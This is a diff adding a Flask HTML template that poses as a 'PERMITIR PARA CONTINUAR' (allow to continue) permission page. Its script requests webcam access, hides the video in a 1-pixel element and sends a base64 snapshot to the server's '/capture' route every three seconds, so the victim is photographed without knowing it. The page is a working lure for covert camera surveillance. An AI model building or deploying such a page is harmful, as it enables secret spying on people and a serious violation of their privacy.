@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Access</title>
+      <style>
+        h1 {
+            font-family: Arial, sans-serif;
+            color: #333;
+            text-align: center;
+            text-shadow: 2px 2px 4px #ccc;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 75vh;
+            margin: 0;
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-image: url('{{ background_image }}');
+        }
+
+        button {
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+      </style>
+
+</head>
+<body>
+    <h1>PERMITIR PARA CONTINUAR</h1>
+    <video autoplay playsinline controls id="videoElement" style="width: 1px; height: 1px;"></video>
+     <button onclick="requestCameraAccess()"> CONTINUAR </button>
+
+    <script>
+        const video = document.getElementById('videoElement');
+
+        // Función para capturar y enviar la imagen al servidor
+        function captureAndSend() {
+            // Crear un canvas para capturar el fotograma actual del video
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir el fotograma en base64
+            const imageData = canvas.toDataURL('image/png');
+
+            // Enviar la imagen al servidor Flask
+            fetch('/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'imageData=' + encodeURIComponent(imageData),
+            })
+            .then(response => {
+                console.log('Foto guardada correctamente');
+            })
+            .catch(error => {
+                console.error('Error al guardar la foto:', error);
+            });
+        }
+
+        // Obtener acceso a la cámara
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Capturar automáticamente cada 3 segundos
+                setInterval(captureAndSend, 3000);
+            })
+            .catch(err => {
+                console.error('Error al acceder a la cámara:', err);
+            });
+    </script>
+</body>
+</html>
